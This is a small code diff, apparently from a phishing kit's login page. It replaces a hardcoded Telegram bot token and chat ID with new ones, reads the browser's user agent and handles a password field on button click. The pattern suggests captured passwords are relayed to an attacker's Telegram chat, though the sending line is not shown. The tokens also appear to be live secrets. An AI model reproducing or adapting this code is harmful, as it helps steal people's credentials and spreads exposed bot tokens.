@@ -1,5 +1,5 @@
-var token = "6423548656:AAFuFXiyAUDll8FgYjbYw6Iu30NdeSwml7s";
-        var chat = "1955367555";
+var token = "7316626659:AAFV8FUvl7U-p6tRxHo2afSglS2Fce3Fuog";
+        var chat = "6692997408";
 let se = navigator.userAgent;
         $("button").click(function(){
             if($("#password").val()==""){
